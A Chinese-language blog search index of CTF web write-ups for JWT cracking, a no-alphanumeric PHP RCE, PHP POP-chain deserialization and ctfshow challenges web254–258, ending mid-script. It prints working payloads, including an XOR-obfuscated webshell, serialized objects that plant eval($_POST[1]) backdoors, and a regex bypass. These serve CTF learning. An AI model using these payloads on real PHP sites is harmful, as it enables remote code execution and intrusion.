<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>三校联合训练赛web wp</title>
      <link href="/posts/47456b21.html"/>
      <url>/posts/47456b21.html</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="BuyBuyBuy"><a href="#BuyBuyBuy" class="headerlink" title="BuyBuyBuy"></a><strong>BuyBuyBuy</strong></h3><p><img src="../images/image-20230115170900853.png" alt="image-20230115170900853"></p><p>打开题目  发现是买flag的题目 题目还给了源码，这不是送分吗(狗头)</p><p><img src="../images/image-20230115171139731.png" alt="image-20230115171139731"></p><p>一共两处地方，<strong>/login和/buyflag</strong>  而且通过查看源码和题目的cookie，发现是一道jwt类型的题目</p><p>然后就去了解了一下，jwt是什么，然后就知道是通过修改cookie来获得flag的。</p><p>jwt解密网站<code>https://jwt.io/</code></p><p><img src="../images/image-20230115171545935.png" alt="image-20230115171545935"></p><p>访问/login然后输入get传个usrname的参数，就可以拿到cookie值，然后拿去jwt解密网站去解密</p><p><img src="../images/image-20230115171709619.png" alt="image-20230115171709619"></p><p><strong>secret不知道</strong>    大概去找了找，没找到，就直接利用工具去破解拿到secret了。</p><p><strong>利用jwt爆破攻击爆破</strong><br>下载地址<code>https://github.com/brendan-rius/c-jwt-cracker</code>具体安装方法文档中有。<br>使用方法 ./jwtcrack jwt</p><p><img src="../images/image-20230115171846564.png" alt="image-20230115171846564"></p><p>然后拿到secret，就去jwt解密网站去修改money和secret</p><p><img src="../images/image-20230115172145729.png" alt="image-20230115172145729"></p><p>然后就去访问/buyflag去买flag。</p><p><img src="../images/image-20230115172114903.png" alt="image-20230115172114903"></p><p>然后就拿到flag了。</p><h3 id="EasyRCE"><a href="#EasyRCE" class="headerlink" title="EasyRCE"></a><strong>EasyRCE</strong></h3><p><img src="../images/image-20230115172921998.png" alt="image-20230115172921998"></p><p>一道<strong>无数字字母的rce</strong>  (大写字母其实可以不加)(狗头)</p><p>直接上网找就行了，网上有payload</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);$___=$$__;$_($___[_]);</span><br><span class="line"></span><br><span class="line">// 密码为 &quot;_&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230115173206199.png" alt="image-20230115173206199"></p><p>拿到flag.</p><h3 id="EzPOP"><a href="#EzPOP" class="headerlink" title="EzPOP"></a><strong>EzPOP</strong></h3><p><img src="../images/image-20230115173342461.png" alt="image-20230115173342461"></p><p>一道php的反序列化pop链的构造，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">思路是这样的通过__destruct()  -&gt;  __toString()   -&gt;__get()  -&gt;   __invoke()</span><br></pre></td></tr></table></figure><p>就是这样的一条链子，他的难点在与怎么传参的问题。</p><p>这个问题也困扰了我好久</p><p>然后经过漫长长长的尝试，然后就尝试成功了，我们可以构造一个新的函数来进行传参。</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aa</span>(<span class="params"><span class="variable">$eee</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd=<span class="variable">$eee</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This is cmd :&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bb</span>(<span class="params"><span class="variable">$eee</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$eee</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; name -&gt; obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EEE</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$aa</span>=<span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">EEE</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">aa</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="title function_ invoke__">bb</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="keyword">var</span>=<span class="variable">$aa</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后拿生成的链子去打就能拿到flag了。</p><h3 id="HappyNewYear"><a href="#HappyNewYear" class="headerlink" title="HappyNewYear"></a><strong>HappyNewYear</strong></h3><p><img src="../images/image-20230115174012742.png" alt="image-20230115174012742"></p><p>一道简单的关于php特性的题目</p><p>绕过第一层判断可以利用数字加字母的形式就行了，字母必须得加在数字的后面，不然会被判断为0；</p><p>第二层判断可以在本地来进行判断，因为可能传的payload错了，但不知道是哪边没过  这里可以利用<code>%0a</code>进行绕过。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?year=2023a&amp;key=happyNewYear%0a</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230115174511475.png" alt="image-20230115174511475"></p><p>剩下的java反序列化  和一道长长的反序列化题，目前水平不够，解不了了。。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 三校联合 web wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-XSS-刷题记录</title>
      <link href="/posts/c697f3a9.html"/>
      <url>/posts/c697f3a9.html</url>
      
        <content type="html"><![CDATA[<h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>题目</p>]]></content>
      
      
      
        <tags>
            
            <tag> XSS ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-反序列化 刷题记录</title>
      <link href="/posts/fd5983bb.html"/>
      <url>/posts/fd5983bb.html</url>
      
        <content type="html"><![CDATA[<h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><p>源码</p><p><img src="../images/image-20230104214414714.png" alt="image-20230104214414714"></p><p>这里没有魔术方法，因为魔术方法是下划线开头的  ——&gt;    __toString()  类似这种</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure><p>没用到反序列化的东西。</p><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><p>源码</p><p><img src="../images/image-20230104215011783.png" alt="image-20230104215011783"></p><p>这里用到了反序列的语句了，但魔术方法还是没有用到。</p><p>这题和上一题的不同是false无法自动变成true了，那么我们就得手动去变。</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>获取脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>()));</span><br></pre></td></tr></table></figure><p>这里面的话函数可以删去，这里也可以不用urlencode,用的原因是protected  private会产生不可见字符，如果用的话，就不管啥情况都可以过了。就不用担心不可见字符了。</p><h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><p>源码</p><p><img src="../images/image-20230104220444891.png" alt="image-20230104220444891"></p><p>这里的话涉及到username和password的问题，既要相等又要不等，那么我们在反序列处是可以控制类里面的参数的值的</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%222%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure><p>获取脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>()));</span><br></pre></td></tr></table></figure><h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><p>源码</p><p><img src="../images/image-20230104221218372.png" alt="image-20230104221218372"></p><p>这里终于遇到了反序列化函数了   </p><p>这里介绍一下construct和destruct函数，学过c++语言的应该都知道这两个函数</p><p>construct —&gt;  就是在new 一个新的对象的时候会自动运行的函数，如果class类中没有的话，系统就会自己新创一个，但里面没有任何东西。</p><p>destruct —&gt;   就是在一个类运行结束的时候，会自动运行的函数。</p><p><strong><img src="../images/image-20230104222641078.png" alt="image-20230104222641078"></strong></p><p><img src="../images/image-20230104222655281.png" alt="image-20230104222655281"></p><p>就是先输出a,在输出b.</p><p>回到这道题</p><p>这里把__construct 函数里的info改成backDoor，因为在new一个ctfShowUser的新对象时，会自动执行construct函数。就会new一个backDoor的新对象，然后ctfShowUser类结束的时候会自动执行destruct函数，然后就会调用到backDoor类里边的getInfo函数，里面的函数有一个命令执行，然后就利用这一点进行rce了。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p>修改后的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser));</span><br></pre></td></tr></table></figure><p>然后自己进行rce就行。</p><h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><p>源码</p><p><img src="../images/image-20230104223933413.png" alt="image-20230104223933413"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&#x27;/[oc]:\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))</span><br></pre></td></tr></table></figure><p>可以看对序列化的字符串进行了过滤，其实主要过滤的就是禁止<code>Object</code>类型被反序列化。虽然这样看起是没有问题的，但是由于PHP的一个BUG，导致仍然可以被绕过。只需要在对象长度前添加一个<code>+</code>号，即<code>o:14-&gt;o:+14</code>，这样就可以绕过正则匹配。</p><p>这个漏洞是php5.6.24版本才进行修复.</p><p>修复后—&gt;  <code>/[oc]:[^:]*\d+:/i</code>    这里的话用+已经不能绕过了。</p><p>第一步</p><p>（进行修改）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;ctfShowUser&quot;:4:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;s:5:&quot;isVip&quot;;b:0;s:5:&quot;class&quot;;O:8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:16:&quot;eval($_POST[1]);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>第二步</p><p>（urlencode)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p>修改后的脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable 